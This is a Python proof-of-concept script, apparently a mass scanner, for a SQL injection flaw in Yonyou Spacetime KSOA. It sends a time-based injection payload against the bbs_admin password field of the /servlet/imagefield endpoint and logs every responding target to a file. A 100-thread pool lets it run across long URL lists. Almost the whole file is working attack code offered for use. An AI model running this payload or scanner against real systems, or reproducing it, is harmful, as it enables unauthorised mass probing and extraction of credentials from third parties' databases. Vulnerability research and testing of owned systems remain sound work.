# -*- coding: utf-8 -*-
import argparse, sys, requests
import base64
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """

██╗  ██╗███████╗ ██████╗  █████╗       ███████╗ ██████╗ ██╗      ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗
██║ ██╔╝██╔════╝██╔═══██╗██╔══██╗      ██╔════╝██╔═══██╗██║      ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝
█████╔╝ ███████╗██║   ██║███████║█████╗███████╗██║   ██║██║█████╗██║██╔██╗ ██║     ██║█████╗  ██║        ██║   
██╔═██╗ ╚════██║██║   ██║██╔══██║╚════╝╚════██║██║▄▄ ██║██║╚════╝██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   
██║  ██╗███████║╚██████╔╝██║  ██║      ███████║╚██████╔╝███████╗ ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   
╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝      ╚══════╝ ╚══▀▀═╝ ╚══════╝ ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   
                                                                                                               
                                       tag:  KSOA-SQL INJECT                                    
                                       @version: 1.0.0   @author: Despacito096           
"""
    print(test)

def poc(target):
    url = target+"/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1%27;WAITFOR%20DELAY%20%270:0:2%27-- HTTP/1.1"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.54",
    }
    try:
        res = requests.post(url,headers=headers,timeout=8,verify=False).text
        # print(res)
        if res == "":
            print(f"[+] {target} exists SQL inject")
            with open("result1.txt", "a+", encoding="utf-8") as f:
                f.write(target+"\n")
        elif "Exception report" in res:
            print(f"[-] {target} serve exception")
        else:
            print("404 not found")
    except:
        print(f"[!]{target} access error!")

def main():
    banner()
    parser = argparse.ArgumentParser(
        description='A SQL injection vulnerability exists in the Yonyou Spacetime KSOA /servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet interface and /servlet/imagefield interface, through which an unauthenticated attacker can obtain sensitive database information and credentials, which may eventually lead to server failure.')
    parser.add_argument("-u", "--url", dest="url", type=str,
                        help=" example: http://www.example.com,USED FOR SINGLE TEST")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt  USED FOR ABUNDANT TESTS")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()